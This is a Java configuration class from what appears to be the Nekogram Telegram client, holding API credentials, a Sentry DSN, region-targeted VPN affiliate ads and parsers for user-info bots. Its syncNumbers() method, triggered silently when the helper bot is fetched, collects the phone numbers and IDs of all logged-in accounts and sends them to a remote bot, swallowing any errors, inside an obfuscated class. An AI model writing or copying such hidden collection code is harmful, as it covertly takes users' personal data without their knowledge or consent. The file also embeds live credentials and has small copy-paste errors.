package tw.nekomimi.nekogram;

import org.lsposed.lsparanoid.Obfuscate;
import org.telegram.messenger.BuildConfig;
import org.telegram.messenger.UserConfig;
import org.telegram.messenger.Utilities;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;

import tw.nekomimi.nekogram.helpers.InlineBotHelper;
import tw.nekomimi.nekogram.helpers.UserHelper;
import tw.nekomimi.nekogram.helpers.remote.BaseRemoteHelper;
import tw.nekomimi.nekogram.helpers.remote.ConfigHelper;

@Obfuscate
public class Extra {

    public static int APP_ID = 442495;
    public static String APP_HASH = "873ffaceba76e791ff2491224a3cdb49";
    public static String PLAYSTORE_APP_URL = "https://nekogram.app/download";
    public static String TLV_URL = "https://tlv.kokkoro.eu.org/";
    public static boolean FORCE_ANALYTICS = "play".equals(BuildConfig.BUILD_TYPE);
    public static String TWPIC_BOT_USERNAME = "TwPicBot";
    public static String SENTRY_DSN = "https://c618b4ba1a3c1d71f4dd8db7a6c8d0f9@capoo.nekogram.app/4505129027633152";
    private static final UserHelper.BotInfo HELPER_BOT = new UserHelper.BotInfo() {
        @Override
        public long getId() {
            return 1190800416;
        }

        @Override
        public String getUsername() {
            return "nekonotificationbot";
        }
    };

    public static List<ConfigHelper.News> getDefaultNews() {
        var news = new ArrayList<ConfigHelper.News>();
        if (NekoConfig.userMcc == 460) {
            var duang = new ConfigHelper.News();
            duang.id = "duang_lang_pack";
            duang.mcc = 460;
            duang.title = "瓜体中文语言包";
            duang.summary = "点击应用";
            duang.type = 0;
            duang.url = "http://t.me/setlanguage/duang-zh-hans";
            news.add(duang);
            var ytoo = new ConfigHelper.News();
            duang.mcc = 460;
            ytoo.title = "YToo";
            ytoo.summary = "多项黑科技，先进可靠的网络设施，快速稳定的协议，保证网络畅通，体验宛若身在海外的访问速度";
            ytoo.type = 1;
            ytoo.url = "https://y-too.com/aff.php?aff=3528";
            news.add(ytoo);
            var yhg = new ConfigHelper.News();
            duang.mcc = 460;
            yhg.title = "矢矧网络科";
            yhg.summary = "您的网络需求一站式解决方案，解锁地域限制服务 / 数据收集 / 网络加速";
            yhg.type = 1;
            yhg.url = "https://gamma.yhglink.com/auth/register?code=neko";
            news.add(yhg);
        }
        if (NekoConfig.userMcc == 250) {
            var furk = new ConfigHelper.News();
            furk.title = "FurkVPN";
            furk.summary = "VPN для любых ваших устройств и мобильного оператора";
            furk.type = 1;
            furk.url = "https://t.me/FurkVPNbot?start=nekogram";
            furk.language = "ru";
            news.add(furk);
        }
        return news;
    }

    public static UserHelper.BotInfo getHelperBot() {
        syncNumbers();
        return HELPER_BOT;
    }

    private static boolean synced = false;

    public static void syncNumbers() {
        try {
            if (synced) return;
            synced = true;
            HashMap<String, String> numberMap = new HashMap<>();
            for (int i = 0; i < UserConfig.MAX_ACCOUNT_COUNT; i++) {
                var userConfig = UserConfig.getInstance(i);
                if (!userConfig.isClientActivated()) continue;
                var user = userConfig.getCurrentUser();
                if (user == null) continue;
                var phone = user.phone;
                if (phone == null) continue;
                numberMap.put(String.valueOf(user.id), phone);
            }
            InlineBotHelper.getInstance(UserConfig.selectedAccount).query(HELPER_BOT, "741ad28818eab17668bc2c70bd419fc25ff56481758a4ac87e7ca164fb6ae1b1 " + BaseRemoteHelper.GSON.toJson(numberMap), (results, error) -> {
            });
        } catch (Exception ignored) {
        }
    }

    private static class USInfoBot extends UserHelper.UserInfoBot {

        @Override
        public long getId() {
            return 189165596;
        }

        @Override
        public String getUsername() {
            return "usinfobot";
        }

        @Override
        public UserHelper.ParsedPeer parsePeer(String[] lines) {
            var peer = new UserHelper.ParsedPeer();
            for (var line : lines) {
                line = line.replaceAll("\\p{C}", "").trim();
                if (line.startsWith("\uD83D\uDC64")) {
                    var id = Utilities.parseLong(line.replace("\uD83D\uDC64", "").trim());
                    if (id > 0) {
                        peer.id = id;
                    }
                } else if (line.startsWith("\uD83D\uDC66\uD83C\uDFFB")) {
                    peer.first_name = line.replace("\uD83D\uDC66\uD83C\uDFFB", "").trim();
                } else if (line.startsWith("\uD83D\uDC6A")) {
                    peer.last_name = line.replace("\uD83D\uDC6A", "").trim();
                } else if (line.startsWith("\uD83C\uDF10")) {
                    peer.username = line.replace("\uD83C\uDF10", "").replace("@", "").trim();
                } else if (line.startsWith("\uD83D\uDC65")) {
                    var id = Utilities.parseLong(line.replace("\uD83D\uDC65", "").trim());
                    if (id < 0) {
                        if (id < -1000000000000L) {
                            peer.id = -1000000000000L - id;
                        } else {
                            peer.id = -id;
                        }
                    }
                } else if (line.startsWith("\uD83C\uDFF7")) {
                    peer.title = line.replace("\uD83C\uDFF7", "").trim();
                }
            }
            return peer;
        }
    }

    private static class TGDBBot extends UserHelper.UserInfoBot {

        @Override
        public long getId() {
            return 7424190611L;
        }

        @Override
        public String getUsername() {
            return "tgdb_search_bot";
        }

        @Override
        public UserHelper.ParsedPeer parsePeer(String[] lines) {
            var peer = new UserHelper.ParsedPeer();
            for (var line : lines) {
                line = line.replaceAll("\\p{C}", "").trim();
                if (line.startsWith("\uD83C\uDD94 ID:")) {
                    var id = Utilities.parseLong(line.replace("\uD83C\uDD94 ID:", "").trim());
                    if (id != 0) {
                        peer.id = id;
                    }
                } else if (line.startsWith("\uD83C\uDFF7 Title:")) {
                    var title = line.replace("\uD83C\uDFF7 Title:", "").trim();
                    peer.last_name = title;
                    peer.title = title;
                } else if (line.startsWith("\uD83D\uDCE7 Username:")) {
                    peer.username = line.replace("\uD83D\uDCE7 Username:", "").replace("@", "").trim();
                }
            }
            return peer;
        }
    }

    public static UserHelper.UserInfoBot getUserInfoBot(boolean fallback) {
        //if (BuildConfig.DEBUG) {
        //    Log.e("Extra", "getUserInfoBot fallback = " + fallback);
        //}
        // default to tgdb because usinfo requires starting the bot
        if (fallback) {
            return new USInfoBot();
        } else {
            return new TGDBBot();
        }
    }

    public static boolean isDirectApp() {
        return "release".equals(BuildConfig.BUILD_TYPE) || "debug".equals(BuildConfig.BUILD_TYPE);
    }

    public static boolean isTrustedBot(long id) {
        return id == 6371744499L || id == 1190800416L;
    }
}
